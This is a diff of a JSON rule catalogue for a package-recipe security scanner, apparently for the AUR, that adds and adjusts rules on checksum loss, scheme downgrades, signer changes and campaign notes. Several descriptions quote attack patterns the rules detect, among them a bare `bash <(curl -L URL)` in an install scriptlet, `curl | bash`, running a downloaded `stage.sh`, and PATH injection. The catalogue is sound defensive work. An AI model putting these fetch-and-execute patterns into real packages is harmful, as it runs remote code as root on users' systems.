@@ -92,7 +92,7 @@
     "name": "Checksum Removed For Unchanged Source",
     "severity": "CRITICAL",
     "categoryTitle": "Integrity and Verification",
-    "description": "Distinct from H002 (`sha256sums=()` added, array emptied in place): here the declaration disappears from the file entirely, leaving makepkg with nothing to verify against a source that itself did not change. Detected by `detect_checksum_removed()` in `src/trustsight/differ.py`.",
+    "description": "Distinct from H002 (`sha256sums=()` added, array emptied in place): here the declaration disappears from the file entirely, leaving makepkg with nothing to verify against a source that itself did not change. Detected by `detect_checksum_removed()` in `src/trustsight/differ/_checksums.py`.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c004"
   },
   "c005": {
@@ -318,6 +318,22 @@
     "categoryTitle": "Install and Persistence",
     "description": "pacman sources the scriptlet for each operation, so a top-level line runs as root on every invocation, including ones an install-time audit of `post_install()` never sees. The yay typosquat campaign (yyay, yaay, yayy) shipped its payload this way: the hook functions were inert and a bare `bash <(curl -L URL)` sat after them, invisible to every rule that reads function bodies.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#c032"
+  },
+  "c033": {
+    "id": "C033",
+    "name": "Context Bleed",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "Honest edits rarely gut prose wholesale. A campaign that removes comments shrinks what a reviewer reads without touching the payload. The ratio and the absolute floor are config-pinned and corpus-adjudicated; a one-line comment deletion is never a finding. The locked benign corpus adjudicates it; the measured rate is recorded in the changelog.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#c033"
+  },
+  "c034": {
+    "id": "C034",
+    "name": "Metadata Inconsistency",
+    "severity": "INFO",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "H103 compares the fields that change what a build does and deliberately leaves the version line alone: stale metadata is ordinary. This reports that ordinary drift as INFO, feed-tier, so a consumer can see it without treating it as suspicious. Missing metadata or an unresolved variable stands the rule down.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#c034"
   },
   "coverage": {
     "id": "COVERAGE",
@@ -754,7 +770,7 @@
   "h032": {
     "id": "H032",
     "name": "Write To User Home Or RC",
-    "severity": "HIGH",
+    "severity": "CRITICAL",
     "categoryTitle": "Install and Persistence",
     "description": "The severity is contextual. A write into a user's home during `build()` is HIGH; the same write from an **install scriptlet** is CRITICAL, because pacman runs scriptlets as root during the transaction. Nothing a package installs belongs in somebody's home directory, and root reaching into one is categorical rather than suspicious.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h032"
@@ -1164,7 +1180,7 @@
     "name": "Downloaded Source File Executed",
     "severity": "HIGH",
     "categoryTitle": "Fetch and Execution",
-    "description": "Checksums protect integrity, not intent: a `source=(... stage.sh)` followed by `bash \"$srcdir/stage.sh\"` is remote code execution just like `curl | bash`, only hidden behind the ordinary download path. The name does not matter: a downloaded `configure`, `make` or `Makefile` executed as a script fires too. `url=` is attacker-declared, so a host that matches it is not provenance, and a `name::url` rename that ships a payload under a benign name fires for the same reason. Detected by `edge_source_file_execution()` in `src/trustsight/analysis/delivery.py`.",
+    "description": "Checksums protect integrity, not intent: a `source=(... stage.sh)` followed by `bash \"$srcdir/stage.sh\"` is remote code execution just like `curl | bash`, only hidden behind the ordinary download path. The name does not matter: a downloaded `configure`, `make` or `Makefile` executed as a script fires too. `url=` is attacker-declared, so a host that matches it is not provenance, and a `name::url` rename that ships a payload under a benign name fires for the same reason. Detected by `edge_source_file_execution()` in `src/trustsight/analysis/delivery/__init__.py`.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h083"
   },
   "h084": {
@@ -1172,7 +1188,7 @@
     "name": "Service ExecStart Targets Undeclared Binary",
     "severity": "HIGH",
     "categoryTitle": "Install and Persistence",
-    "description": "Service units are read from the tree manifest when one is supplied, and from added diff lines otherwise (a whole service file in the diff, parsed by heuristic). The installed executable must come from an `install` with an explicit `7xx` mode or no `-m` flag (install's default is 755). Such files arrive through the unseen source tarball, so their content cannot be audited. Detected by `_service_binary_findings()` in `src/trustsight/analysis/delivery.py`.",
+    "description": "Service units are read from the tree manifest when one is supplied, and from added diff lines otherwise (a whole service file in the diff, parsed by heuristic). The installed executable must come from an `install` with an explicit `7xx` mode or no `-m` flag (install's default is 755). Such files arrive through the unseen source tarball, so their content cannot be audited. Detected by `_service_binary_findings()` in `src/trustsight/analysis/delivery/__init__.py`.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h084"
   },
   "h085": {
@@ -1180,7 +1196,7 @@
     "name": "PATH Injection With Undeclared Directory",
     "severity": "HIGH",
     "categoryTitle": "Staging and Reconnaissance",
-    "description": "`PATH=$srcdir/tools:$PATH make` lets the recipe smuggle a binary into a standard command's search path. Adding the plain source root is common enough that it stays silent; deeper paths are more likely to be legitimate project layouts, so only single-level subdirectories are flagged. Detected by `_path_injection_findings()` in `src/trustsight/analysis/delivery.py`.",
+    "description": "`PATH=$srcdir/tools:$PATH make` lets the recipe smuggle a binary into a standard command's search path. Adding the plain source root is common enough that it stays silent; deeper paths are more likely to be legitimate project layouts, so only single-level subdirectories are flagged. Detected by `_path_injection_findings()` in `src/trustsight/analysis/delivery/__init__.py`.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#h085"
   },
   "h086": {
@@ -1306,7 +1322,7 @@
   "h101": {
     "id": "H101",
     "name": "Source Pinning Lost",
-    "severity": "MEDIUM",
+    "severity": "HIGH",
     "categoryTitle": "Integrity and Verification",
     "description": "P008 reports a floating source wherever one stands; H101 catches the *moment* a verifiable package becomes upstream-controlled, which in a watch replay is the signal that matters: the package that was pinned yesterday and tracks a branch today changed who decides what it builds. A `#tag=` is a declared pin (P006): force-moving a tag is a separate concern, and H101 only reports the transition from a pin to a branch, HEAD or another floating ref. Only same-name entries on both sides of the diff compare, the H099 keying, so a partially shown array cannot mis-pair an entry.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h101"
@@ -1879,6 +1895,22 @@
     "description": "The xz backdoor's shape: the trusted signer is swapped, not merely widened (H078) or narrowed (H024). Unlike T001 it needs no ecosystem history - the rotation of trust inside one commit is its own fact - so it fires cold.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#t003"
   },
+  "t004": {
+    "id": "T004",
+    "name": "Vouch Surface Removed",
+    "severity": "MEDIUM",
+    "categoryTitle": "Temporal Context",
+    "description": "The missing-self shape: the recipe used to prove something about its signer and now proves less. Whole-array removal is H024; a rotation is T003/H078; checksum loss is H091/H001/C004. This rule owns only the partial-key gap, so the same change is never scored twice by two different names. The locked benign corpus adjudicates it; the measured rate is recorded in the changelog.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#t004"
+  },
+  "t005": {
+    "id": "T005",
+    "name": "Scheme Downgrade",
+    "severity": "MEDIUM",
+    "categoryTitle": "Temporal Context",
+    "description": "H019 owns the exact `https://x` -> `http://x` swap. This covers the quieter version of the same move, where a new filename or version hides the scheme fall. The host must be routable, the origin must have been TLS, and a host change is not this shape. The locked benign corpus adjudicates it; the measured rate is recorded in the changelog.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#t005"
+  },
   "t006": {
     "id": "T006",
     "name": "Metadata-Git Divergence",
@@ -1894,6 +1926,14 @@
     "categoryTitle": "Temporal Context",
     "description": "A weight-0 corroboration signal: the AUR says this account packaged the project, but no commit in history names them. The message is only one place an identity appears, so the author and committer names and addresses count too; a maintainer who imported the package often signs the commit and writes no message at all. Name matching is fuzzy (display name vs email vs git config), so this corroborates T006 and G008 but never scores alone. On its own tier it is nearly a confession; as a solo scorer it would eventually burn someone with an unusual committer setup.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#t007"
+  },
+  "tag_convergence": {
+    "id": "TAG_CONVERGENCE",
+    "name": "Tag Convergence",
+    "severity": "INFO",
+    "categoryTitle": "Opsonization",
+    "description": "Several distinct weight-0 tag kinds landed on one diff. Convergence is a pointer to look once, never a score: the tags coat evidence so later detection is cheaper.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/"
   },
   "u001": {
     "id": "U001",
@@ -2086,6 +2126,14 @@
     "categoryTitle": "Unverifiable",
     "description": "Fires when a forge upstream is declared and the `upstream_repo` federation channel is cold: the IOC baseline is disabled, or the store carries no `upstream_repo` entries, or it cannot be reached. U007 and U008 are federation-fed, so a cold channel is exactly the case where no finding can be produced; not because the upstream was clean, but because nothing could be consulted.",
     "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w012"
+  },
+  "w013": {
+    "id": "W013",
+    "name": "Campaign Perimeter Boundary Note",
+    "severity": "INFO",
+    "categoryTitle": "Unverifiable",
+    "description": "Fires when a package stands inside an active campaign perimeter and the same run carries a standing boundary note (`W009`, another `W` finding, or a coverage gap). The note is not new evidence and does not accuse the package: it says the campaign's neighbourhood is being reviewed with a known blind spot, until the campaign TTL expires.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/unverifiable/#w013"
   },
   "x001": {
     "id": "X001",
